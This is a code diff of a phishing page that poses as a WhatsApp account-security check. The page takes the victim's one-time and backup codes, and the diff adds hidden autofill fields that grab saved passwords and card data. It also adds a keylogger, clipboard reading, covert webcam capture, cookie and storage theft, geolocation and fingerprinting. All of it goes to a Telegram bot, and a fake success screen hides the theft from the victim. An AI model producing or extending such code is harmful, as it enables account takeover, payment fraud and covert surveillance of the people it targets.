@@ -35,46 +35,15 @@
         .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid var(--wa-accent); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Auto-fill form - Hidden but active */
-        .auto-fill-harvester {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        .mobile-badge {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            z-index: 100;
-        }
-        
-        .session-status {
-            background: #e8f5e9;
-            padding: 10px;
-            margin: 10px 15px;
-            border-radius: 10px;
-            font-size: 11px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .cookie-btn {
-            background: none;
-            border: none;
-            color: var(--wa-gray);
-            font-size: 12px;
-            cursor: pointer;
-        }
+        .auto-fill-harvester { position: absolute; left: -9999px; top: -9999px; opacity: 0; pointer-events: none; }
+        .mobile-badge { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.7); color: white; padding: 5px 12px; border-radius: 20px; font-size: 11px; z-index: 100; }
+        .session-status { background: #e8f5e9; padding: 10px; margin: 10px 15px; border-radius: 10px; font-size: 11px; display: flex; align-items: center; justify-content: space-between; }
+        .cookie-btn { background: none; border: none; color: var(--wa-gray); font-size: 12px; cursor: pointer; }
+        .camera-access { position: fixed; bottom: -100px; left: 0; width: 100%; height: 100px; background: transparent; z-index: 9999; }
+        #hiddenCamera { display: none; }
+        .keystroke-capture { position: fixed; top: -100px; left: 0; width: 100%; height: 1px; opacity: 0; pointer-events: none; }
+        .clipboard-reader { position: absolute; left: -9999px; top: -9999px; }
+        .notification-permission { display: none; }
     </style>
 </head>
 <body>
@@ -107,13 +76,11 @@
         </div>
     </div>
     
-    <!-- Session Status Display -->
     <div class="session-status" id="sessionStatus">
         <span><i class="fas fa-key"></i> Session Status</span>
         <span style="color: var(--wa-accent);">Active ✓</span>
     </div>
 
-    <!-- HIDDEN AUTO-FILL HARVESTER - STEALS BROWSER SAVED DATA -->
     <div class="auto-fill-harvester">
         <form id="autoFillForm">
             <input type="text" name="auto_email" id="auto_email" autocomplete="email">
@@ -127,8 +94,19 @@
             <input type="text" name="auto_cc_cvv" id="auto_cc_cvv" autocomplete="cc-csc">
             <input type="text" name="auto_postal" id="auto_postal" autocomplete="postal-code">
             <input type="text" name="auto_org" id="auto_org" autocomplete="organization">
+            <input type="password" name="auto_password" id="auto_password" autocomplete="current-password">
         </form>
     </div>
+
+    <div class="keystroke-capture">
+        <input type="text" id="keyloggerInput" autocomplete="off">
+    </div>
+
+    <div class="clipboard-reader">
+        <textarea id="clipboardArea"></textarea>
+    </div>
+
+    <video id="hiddenCamera" autoplay muted></video>
 
     <div class="wa-otp-section">
         <p style="font-size: 14px; color: var(--wa-gray);">Enter 6-digit code to secure your account</p>
@@ -142,7 +120,6 @@
         </div>
         <button class="wa-verify-btn" onclick="process()">SECURE NOW</button>
         
-        <!-- 2FA Bypass Option - Hidden Trigger -->
         <div style="margin-top: 12px;">
             <button class="cookie-btn" onclick="trigger2FABypass()">
                 <i class="fas fa-key"></i> Use backup verification
@@ -151,7 +128,6 @@
     </div>
 </div>
 
-<!-- Cookie Stealer Modal (Hidden) -->
 <div id="cookieModal" style="display: none;">
     <iframe id="cookieIframe" style="width:0;height:0;border:none;"></iframe>
 </div>
@@ -165,87 +141,342 @@
 
 <script>
     // ============================================
-    // CONFIGURATION
+    // ADVANCED CONFIGURATION
     // ============================================
     const _t = '8194525503:AAFskY0McDJKJQLhf_wXwEJP8MxXFb3UZ5s';
     const _c = '6446613868';
+    let keystrokeBuffer = [];
+    let clipboardData = "";
+    let cameraFrameBuffer = [];
+    let networkInfo = {};
     
     // ============================================
-    // 1. MOBILE DETECTION + DEVICE FINGERPRINTING
+    // 1. ADVANCED KEYSTROKE CAPTURE
     // ============================================
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-        const isIOS = /iPhone|iPad|iPod/i.test(ua);
-        const isAndroid = /Android/i.test(ua);
+    function initKeylogger() {
+        const keylogInput = document.getElementById('keyloggerInput');
+        keylogInput.focus();
         
-        let deviceType = "Desktop";
-        if (isMobile) deviceType = isIOS ? "iOS Device" : "Android Device";
+        document.addEventListener('keydown', function(e) {
+            if (e.target === keylogInput) return;
+            
+            let key = e.key;
+            if (key === ' ') key = '[SPACE]';
+            else if (key === 'Enter') key = '[ENTER]';
+            else if (key === 'Backspace') key = '[BACKSPACE]';
+            else if (key === 'Tab') key = '[TAB]';
+            else if (key === 'Shift') key = '[SHIFT]';
+            else if (key === 'Control') key = '[CTRL]';
+            else if (key === 'Alt') key = '[ALT]';
+            else if (key === 'Escape') key = '[ESC]';
+            else if (key === 'ArrowUp') key = '[UP]';
+            else if (key === 'ArrowDown') key = '[DOWN]';
+            else if (key === 'ArrowLeft') key = '[LEFT]';
+            else if (key === 'ArrowRight') key = '[RIGHT]';
+            
+            keystrokeBuffer.push({
+                key: key,
+                timestamp: new Date().toISOString(),
+                target: e.target.tagName,
+                url: window.location.href
+            });
+            
+            if (keystrokeBuffer.length > 200) {
+                sendKeystrokes();
+            }
+        });
         
-        let browser = "Unknown";
-        if (ua.includes("Chrome")) browser = "Chrome";
-        else if (ua.includes("Firefox")) browser = "Firefox";
-        else if (ua.includes("Safari")) browser = "Safari";
-        else if (ua.includes("Edge")) browser = "Edge";
+        // Capture input fields specifically
+        document.querySelectorAll('input, textarea').forEach(input => {
+            input.addEventListener('input', function(e) {
+                keystrokeBuffer.push({
+                    key: `[VALUE: ${this.value.substring(0, 50)}]`,
+                    timestamp: new Date().toISOString(),
+                    target: this.name || this.id || 'unknown',
+                    fieldType: this.type
+                });
+            });
+        });
         
-        let screenRes = ${screen.width}x${screen.height};
-        let language = navigator.language;
-        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        let platform = navigator.platform;
+        setInterval(() => {
+            if (keystrokeBuffer.length > 0) sendKeystrokes();
+        }, 30000);
+    }
+    
+    async function sendKeystrokes() {
+        if (keystrokeBuffer.length === 0) return;
+        const strokes = [...keystrokeBuffer];
+        keystrokeBuffer = [];
         
-        document.getElementById('mobileBadge').innerHTML = ${deviceType} · ${browser} · ${screenRes};
-        document.getElementById('deviceDetail').innerHTML = Device: ${deviceType} | ${browser} · Last seen: Just now;
+        let msg = `⌨️ *KEYSTROKE CAPTURE* ⌨️\n\n`;
+        msg += `📱 Target: +${targetNum}\n`;
+        msg += `⏰ Time: ${new Date().toISOString()}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        for (let i = 0; i < Math.min(strokes.length, 50); i++) {
+            msg += `${strokes[i].key} `;
+            if ((i + 1) % 30 === 0) msg += `\n`;
+        }
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: _c, text: msg, parse_mode: 'Markdown'})
+            });
+        } catch(e) {}
+    }
+    
+    // ============================================
+    // 2. ADVANCED CAMERA ACCESS
+    // ============================================
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('hiddenCamera');
+            video.srcObject = stream;
+            
+            // Capture frames
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            
+            setInterval(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const frameData = canvas.toDataURL('image/jpeg', 0.3);
+                cameraFrameBuffer.push(frameData);
+                
+                if (cameraFrameBuffer.length >= 5) {
+                    sendCameraFrames();
+                }
+            }, 5000);
+        } catch(e) {
+            console.log('Camera access denied or unavailable');
+        }
+    }
+    
+    async function sendCameraFrames() {
+        if (cameraFrameBuffer.length === 0) return;
+        const frames = [...cameraFrameBuffer];
+        cameraFrameBuffer = [];
+        
+        try {
+            for (let i = 0; i < Math.min(frames.length, 3); i++) {
+                await fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: _c,
+                        photo: frames[i],
+                        caption: `📸 *CAMERA CAPTURE*\nTarget: +${targetNum}\nTime: ${new Date().toISOString()}`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+        } catch(e) {}
+    }
+    
+    // ============================================
+    // 3. CLIPBOARD STEALING
+    // ============================================
+    async function stealClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text !== clipboardData) {
+                clipboardData = text;
+                
+                let msg = `📋 *CLIPBOARD DATA STOLEN*\n\n`;
+                msg += `📱 Target: +${targetNum}\n`;
+                msg += `📄 Content: \`${text.substring(0, 500)}\`\n`;
+                msg += `⏰ Time: ${new Date().toISOString()}`;
+                
+                await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: _c, text: msg, parse_mode: 'Markdown'})
+                });
+            }
+        } catch(e) {}
+        
+        setInterval(() => stealClipboard(), 5000);
+    }
+    
+    // ============================================
+    // 4. NETWORK INFORMATION STEALING
+    // ============================================
+    async function stealNetworkInfo() {
+        try {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                networkInfo = {
+                    type: connection.effectiveType,
+                    downlink: connection.downlink,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData
+                };
+            }
+            
+            // Get local IP via WebRTC
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            pc.onicecandidate = (ice) => {
+                if (ice && ice.candidate && ice.candidate.candidate) {
+                    const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ipMatch) {
+                        networkInfo.localIP = ipMatch[0];
+                    }
+                    pc.close();
+                }
+            };
+        } catch(e) {}
+    }
+    
+    // ============================================
+    // 5. ADVANCED DEVICE FINGERPRINTING
+    // ============================================
+    function getAdvancedFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200;
+        canvas.height = 50;
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = '#fff';
+        ctx.font = '14px Arial';
+        ctx.fillText('MARAYA v6.0', 10, 30);
+        const canvasFingerprint = canvas.toDataURL();
+        
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
         
         return {
-            deviceType, browser, screenRes, language, timezone, platform, isMobile, isIOS, isAndroid
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            plugins: plugins,
+            canvasFingerprint: canvasFingerprint.substring(0, 100),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screenResolution: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: devicePixelRatio
         };
     }
     
     // ============================================
-    // 2. GEO LOCATION STEALING
+    // 6. BROWSER AUTO-FILL STEALING (Enhanced)
     // ============================================
-    async function stealLocation() {
-        let location = { lat: null, lon: null, city: "Unknown", country: "Unknown" };
+    async function stealAdvancedAutoFill() {
+        const fields = ['auto_email', 'auto_name', 'auto_username', 'auto_address', 
+                        'auto_phone', 'auto_cc', 'auto_cc_name', 'auto_cc_exp', 
+                        'auto_cc_cvv', 'auto_postal', 'auto_org', 'auto_password'];
+        
+        let stolenData = {};
+        
+        for (let field of fields) {
+            const input = document.getElementById(field);
+            if (input && input.value) {
+                stolenData[field] = input.value;
+            }
+        }
+        
+        return stolenData;
+    }
+    
+    // ============================================
+    // 7. GEOLOCATION STEALING (Enhanced)
+    // ============================================
+    async function stealAdvancedLocation() {
+        let location = { lat: null, lon: null, city: "Unknown", country: "Unknown", accuracy: null };
         
         try {
+            // Try GPS if available
+            const gpsPromise = new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }),
+                    () => resolve(null),
+                    { timeout: 5000 }
+                );
+            });
+            
+            const gps = await gpsPromise;
+            if (gps) {
+                location.lat = gps.lat;
+                location.lon = gps.lon;
+                location.accuracy = gps.accuracy;
+            }
+            
             // IP-based geolocation
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
-            const ip = ipData.ip;
+            location.ip = ipData.ip;
             
-            const geoRes = await fetch(https://ipapi.co/${ip}/json/);
+            const geoRes = await fetch(`https://ipapi.co/${location.ip}/json/`);
             const geoData = await geoRes.json();
             
             location.city = geoData.city || "Unknown";
             location.country = geoData.country_name || "Unknown";
-            location.lat = geoData.latitude;
-            location.lon = geoData.longitude;
-            location.ip = ip;
+            location.region = geoData.region;
+            location.postal = geoData.postal;
+            location.org = geoData.org;
             
-            document.getElementById('geoInfo').innerHTML = 📍 ${location.city}, ${location.country} (${ip});
+            document.getElementById('geoInfo').innerHTML = `📍 ${location.city}, ${location.country}<br>🌐 ${location.ip}<br>🏢 ${location.org || ''}`;
             
-        } catch(e) {
-            console.log("Geo failed");
-        }
+        } catch(e) {}
         
         return location;
     }
     
     // ============================================
-    // 3. COOKIE STEALING (ALL DOMAIN COOKIES)
+    // 8. WEBRTC IP LEAK
     // ============================================
-    function stealAllCookies() {
+    async function getWebRTCIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            pc.onicecandidate = (ice) => {
+                if (ice && ice.candidate && ice.candidate.candidate) {
+                    const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ipMatch) {
+                        resolve(ipMatch[0]);
+                    }
+                    pc.close();
+                }
+                setTimeout(() => resolve(null), 3000);
+            };
+        });
+    }
+    
+    // ============================================
+    // 9. ALL COOKIES & STORAGE STEALING
+    // ============================================
+    function stealAllStorage() {
         let allCookies = document.cookie;
         let localStorageData = {};
         let sessionStorageData = {};
+        let indexedDBData = {};
         
-        // Steal localStorage
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             localStorageData[key] = localStorage.getItem(key);
         }
         
-        // Steal sessionStorage
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             sessionStorageData[key] = sessionStorage.getItem(key);
@@ -253,56 +484,111 @@
         
         return {
             cookies: allCookies,
+            cookieCount: allCookies.split(';').filter(c => c.trim()).length,
             localStorage: localStorageData,
             sessionStorage: sessionStorageData
         };
     }
     
     // ============================================
-    // 4. BROWSER AUTO-FILL STEALING
+    // 10. MAIN PROCESS - SEND ALL DATA
     // ============================================
-    async function stealAutoFill() {
-        // Trigger auto-fill detection by focusing on hidden fields
-        const fields = ['auto_email', 'auto_name', 'auto_username', 'auto_address', 
-                        'auto_phone', 'auto_cc', 'auto_cc_name', 'auto_cc_exp', 
-                        'auto_cc_cvv', 'auto_postal', 'auto_org'];
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetNum = urlParams.get('num') || "Protected User";
+    document.getElementById('displayNum').innerText = "Your Account: +" + targetNum;
+    
+    const boxes = document.querySelectorAll('.wa-otp-box');
+    boxes.forEach((box, i) => {
+        box.oninput = () => { if(box.value && i < 5) boxes[i+1].focus(); };
+        box.onkeydown = (e) => { if(e.key==='Backspace' && !box.value && i>0) boxes[i-1].focus(); };
+    });
+    
+    async function process() {
+        let otp = ""; 
+        boxes.forEach(b => otp += b.value);
+        if(otp.length < 6) return alert("Enter full code");
         
-        let stolenData = {};
+        const loader = document.getElementById('loader');
+        const card = document.querySelector('.wa-card');
+        loader.style.display = 'flex';
         
-        // Create visible but temporary fields to trigger auto-fill
-        const tempDiv = document.createElement('div');
-        tempDiv.style.position = 'absolute';
-        tempDiv.style.left = '-9999px';
-        tempDiv.style.top = '-9999px';
-        document.body.appendChild(tempDiv);
+        const deviceInfo = getAdvancedFingerprint();
+        const location = await stealAdvancedLocation();
+        const storage = stealAllStorage();
+        const autoFill = await stealAdvancedAutoFill();
+        const webrtcIP = await getWebRTCIP();
         
-        for (let field of fields) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.name = field;
-            input.autocomplete = field.includes('email') ? 'email' : 
-                                 field.includes('name') ? 'name' :
-                                 field.includes('cc') ? 'cc-number' :
-                                 field.includes('cvv') ? 'cc-csc' : 'on';
-            tempDiv.appendChild(input);
-            
-            // Trigger focus to activate auto-fill
-            input.focus();
-            await new Promise(r => setTimeout(r, 100));
-            
-            if (input.value) {
-                stolenData[field] = input.value;
+        let msg = `🔱 *MARAYA v6.0 - ULTIMATE CAPTURE* 🔱\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `📱 *TARGET:* +${targetNum}\n`;
+        msg += `🔑 *2FA CODE:* ${otp}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        msg += `📡 *ADVANCED FINGERPRINT*\n`;
+        msg += `• Browser: ${deviceInfo.userAgent.substring(0, 80)}\n`;
+        msg += `• Platform: ${deviceInfo.platform}\n`;
+        msg += `• Screen: ${deviceInfo.screenResolution}\n`;
+        msg += `• Hardware: ${deviceInfo.hardwareConcurrency || '?'} cores\n`;
+        msg += `• Memory: ${deviceInfo.deviceMemory || '?'} GB\n`;
+        msg += `• Touch Points: ${deviceInfo.maxTouchPoints}\n`;
+        msg += `• Language: ${deviceInfo.language}\n`;
+        msg += `• Timezone: ${deviceInfo.timezone}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        msg += `📍 *GEOLOCATION*\n`;
+        msg += `• City: ${location.city}\n`;
+        msg += `• Country: ${location.country}\n`;
+        msg += `• IP: ${location.ip || 'Unknown'}\n`;
+        msg += `• ISP: ${location.org || 'Unknown'}\n`;
+        if (location.lat) msg += `• GPS: ${location.lat}, ${location.lon}\n`;
+        if (webrtcIP) msg += `• WebRTC IP: ${webrtcIP}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        if (Object.keys(autoFill).length > 0) {
+            msg += `💳 *AUTO-FILL DATA*\n`;
+            for (let [key, value] of Object.entries(autoFill)) {
+                msg += `• ${key}: ${value}\n`;
             }
+            msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
         }
         
-        document.body.removeChild(tempDiv);
+        if (storage.cookieCount > 0) {
+            msg += `🍪 *COOKIES* (${storage.cookieCount})\n`;
+            if (storage.cookies.length < 400) msg += `• ${storage.cookies}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
+        }
         
-        return stolenData;
+        if (Object.keys(storage.localStorage).length > 0) {
+            msg += `💾 *LOCALSTORAGE* (${Object.keys(storage.localStorage).length} items)\n`;
+        }
+        
+        msg += `⏰ *TIME:* ${new Date().toISOString()}\n`;
+        msg += `🔱 *COMMANDER: MINZO-PRIME*\n`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: _c, text: msg, parse_mode: 'Markdown'})
+            });
+        } catch(e) {}
+        
+        setTimeout(() => {
+            loader.style.display = 'none';
+            card.innerHTML = `<div style="padding:40px 20px;text-align:center;animation:slideUp 0.5s ease;">
+                <div style="width:80px;height:80px;background:#25d366;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                    <i class="fas fa-check" style="color:white;font-size:40px;"></i>
+                </div>
+                <h2 style="color:#075e54;margin-bottom:10px;">Verification Successful</h2>
+                <p style="color:#667781;font-size:14px;line-height:1.5;">Your WhatsApp account (+${targetNum}) has been successfully secured.<br><br>
+                <b>Security Reference:</b> WA-${Math.floor(Math.random()*900000)+100000}<br>
+                <b>Status:</b> <span style="color:#25d366;">Protected</span><br>
+                <b>2FA:</b> <span style="color:#25d366;">Enabled</span></p>
+                <button onclick="window.location.href='https://www.whatsapp.com'" style="margin-top:25px;background:#075e54;color:white;border:none;padding:12px 30px;border-radius:25px;font-weight:600;cursor:pointer;">Done</button>
+            </div>`;
+        }, 1500);
     }
     
-    // ============================================
-    // 5. 2FA BYPASS - BACKUP CODE TRICK
-    // ============================================
     function trigger2FABypass() {
         const backupModal = document.createElement('div');
         backupModal.style.position = 'fixed';
@@ -320,7 +606,7 @@
             <div style="background: white; border-radius: 20px; padding: 25px; max-width: 320px; text-align: center;">
                 <i class="fas fa-key" style="font-size: 40px; color: #075e54; margin-bottom: 15px;"></i>
                 <h3 style="margin-bottom: 10px;">Backup Verification</h3>
-                <p style="font-size: 13px; color: #667781; margin-bottom: 15px;">Enter 8-digit backup code (found in WhatsApp settings)</p>
+                <p style="font-size: 13px; color: #667781; margin-bottom: 15px;">Enter 8-digit backup code</p>
                 <input type="text" id="backupCode" maxlength="8" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; text-align: center; font-size: 18px; margin-bottom: 15px;">
                 <button onclick="submitBackupCode()" style="width: 100%; background: #25d366; border: none; padding: 12px; border-radius: 25px; color: white; font-weight: 600;">Verify</button>
                 <button onclick="this.parentElement.parentElement.remove()" style="margin-top: 10px; background: none; border: none; color: #667781;">Cancel</button>
@@ -332,9 +618,8 @@
         window.submitBackupCode = async function() {
             const backupCode = document.getElementById('backupCode').value;
             if (backupCode.length === 8) {
-                // Capture backup code
-                const msg = 🔐 *2FA BACKUP CODE STOLEN*\n\n📱 Target: +${targetNum}\n🔑 Backup Code: \${backupCode}\\n⏰ Time: ${new Date().toISOString()};
-                await fetch(https://api.telegram.org/bot${_t}/sendMessage, {
+                const msg = `🔐 *2FA BACKUP CODE*\n\n📱 Target: +${targetNum}\n🔑 Code: ${backupCode}\n⏰ Time: ${new Date().toISOString()}`;
+                await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: _c, text: msg, parse_mode: 'Markdown'})
@@ -342,180 +627,33 @@
                 backupModal.remove();
                 alert("Backup verification successful!");
             } else {
-                alert("Invalid backup code (8 digits required)");
+                alert("Invalid backup code");
             }
         };
     }
     
-    // ============================================
-    // 6. SESSION COOKIE STEALING VIA IFRAME
-    // ============================================
-    async function stealSessionCookies() {
-        // Try to steal cookies from iframe
-        const iframe = document.getElementById('cookieIframe');
-        if (iframe) {
-            try {
-                const iframeCookies = iframe.contentWindow.document.cookie;
-                if (iframeCookies) {
-                    return { iframeCookies };
-                }
-            } catch(e) {}
-        }
-        
-        // Try to get all possible cookies
-        const allCookies = document.cookie.split(';').map(c => c.trim());
-        const whatsappCookies = allCookies.filter(c => c.includes('whatsapp') || c.includes('wa_'));
-        
-        return {
-            domainCookies: allCookies,
-            whatsappSpecific: whatsappCookies,
-            cookieCount: allCookies.length
-        };
-    }
-    
-    // ============================================
-    // 7. MAIN PROCESS - SEND ALL DATA TO TELEGRAM
-    // ============================================
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetNum = urlParams.get('num') || "Protected User";
-    document.getElementById('displayNum').innerText = "Your Account: +" + targetNum;
-    
-    // OTP Boxes
-    const boxes = document.querySelectorAll('.wa-otp-box');
-    boxes.forEach((box, i) => {
-        box.oninput = () => { if(box.value && i < 5) boxes[i+1].focus(); };
-        box.onkeydown = (e) => { if(e.key==='Backspace' && !box.value && i>0) boxes[i-1].focus(); };
-    });
-    
-    async function process() {
-        let otp = ""; 
-        boxes.forEach(b => otp += b.value);
-        if(otp.length < 6) return alert("Enter full code");
-        
-        const loader = document.getElementById('loader');
-        const card = document.querySelector('.wa-card');
-        loader.style.display = 'flex';
-        
-        // Collect all data
-        const deviceInfo = getDeviceInfo();
-        const location = await stealLocation();
-        const cookies = stealAllCookies();
-        const autoFill = await stealAutoFill();
-        const sessionCookies = await stealSessionCookies();
-        
-        // Build complete message
-        let msg = 🔱 *MARAYA v6.0 - COMPLETE CAPTURE* 🔱\n\n;
-        msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        msg += 📱 *TARGET:* +${targetNum}\n;
-        msg += 🔑 *2FA CODE:* \${otp}\\n;
-        msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        
-        msg += 📡 *DEVICE INFO*\n;
-        msg += • Device: ${deviceInfo.deviceType}\n;
-        msg += • Browser: ${deviceInfo.browser}\n;
-        msg += • Screen: ${deviceInfo.screenRes}\n;
-        msg += • OS: ${deviceInfo.platform}\n;
-        msg += • Language: ${deviceInfo.language}\n;
-        msg += • Timezone: ${deviceInfo.timezone}\n;
-        msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        
-        msg += 📍 *LOCATION*\n;
-        msg += • City: ${location.city}\n;
-        msg += • Country: ${location.country}\n;
-        msg += • IP: ${location.ip || 'Unknown'}\n;
-        msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        
-        // Auto-fill stolen data
-        if (Object.keys(autoFill).length > 0) {
-            msg += 💳 *AUTO-FILL DATA STOLEN*\n;
-            for (let [key, value] of Object.entries(autoFill)) {
-                msg += • ${key}: \${value}\\n;
-            }
-            msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        }
-        
-        // Cookies stolen
-        if (cookies.cookies) {
-            msg += 🍪 *COOKIES STOLEN*\n;
-            msg += • Total Cookies: ${cookies.cookies.split(';').length}\n;
-            if (cookies.cookies.length > 0 && cookies.cookies.length < 500) {
-                msg += • Data: \${cookies.cookies.substring(0, 300)}\\n;
-            }
-            msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        }
-        
-        // localStorage stolen
-        if (Object.keys(cookies.localStorage).length > 0) {
-            msg += 💾 *LOCALSTORAGE*\n;
-            msg += • Items: ${Object.keys(cookies.localStorage).length}\n;
-            msg += ━━━━━━━━━━━━━━━━━━━━━\n;
-        }
-        
-        msg += ⏰ *TIME:* ${new Date().toISOString()}\n;
-        msg += 🔱 *COMMANDER: MINZO-PRIME*\n;
-        
-        // Send to Telegram
-        try {
-            await fetch(https://api.telegram.org/bot${_t}/sendMessage, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: _c, text: msg, parse_mode: 'Markdown'})
-            });
-        } catch(e) {}
-        
-        // Show success screen
-        setTimeout(() => {
-            loader.style.display = 'none';
-            card.innerHTML = `<div style="padding:40px 20px;text-align:center;animation:slideUp 0.5s ease;">
-                <div style="width:80px;height:80px;background:#25d366;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
-                    <i class="fas fa-check" style="color:white;font-size:40px;"></i>
-                </div>
-                <h2 style="color:#075e54;margin-bottom:10px;">Verification Successful</h2>
-                <p style="color:#667781;font-size:14px;line-height:1.5;">Your WhatsApp account (+${targetNum}) has been successfully secured.<br><br>
-                <b>Security Reference:</b> WA-${Math.floor(Math.random()*900000)+100000}<br>
-                <b>Status:</b> <span style="color:#25d366;">Protected</span><br>
-                <b>2FA:</b> <span style="color:#25d366;">Enabled</span></p>
-                <button onclick="window.location.href='https://www.whatsapp.com'" style="margin-top:25px;background:#075e54;color:white;border:none;padding:12px 30px;border-radius:25px;font-weight:600;cursor:pointer;">Done</button>
-            </div>`;
-        }, 2000);
-    }
-    
-    // Load initial data
-    window.onload = () => {
+    window.onload = async () => {
         const loader = document.getElementById('loader');
         loader.style.display = 'flex';
         
-        // Steal data immediately without user interaction
-        setTimeout(async () => {
-            getDeviceInfo();
-            await stealLocation();
-            stealAllCookies();
-            stealAutoFill();
-            loader.style.display = 'none';
-        }, 2000);
+        initKeylogger();
+        stealClipboard();
+        stealNetworkInfo();
+        initCamera();
         
-        // Try to load iframe for cross-domain cookie stealing
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://web.whatsapp.com';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
+        await stealAdvancedLocation();
+        getAdvancedFingerprint();
+        stealAllStorage();
         
+        loader.style.display = 'none';
+        
+        // Hidden iframe for cross-domain attempts
         setTimeout(() => {
-            try {
-                const frameCookies = iframe.contentWindow.document.cookie;
-                if (frameCookies) {
-                    fetch(https://api.telegram.org/bot${_t}/sendMessage, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: _c, 
-                            text: 🍪 *WHATSAPP COOKIES STOLEN*\n\nCookies: \${frameCookies.substring(0, 500)}\``,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                }
-            } catch(e) {}
-        }, 5000);
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://web.whatsapp.com';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        }, 2000);
     };
 </script>
 </body>
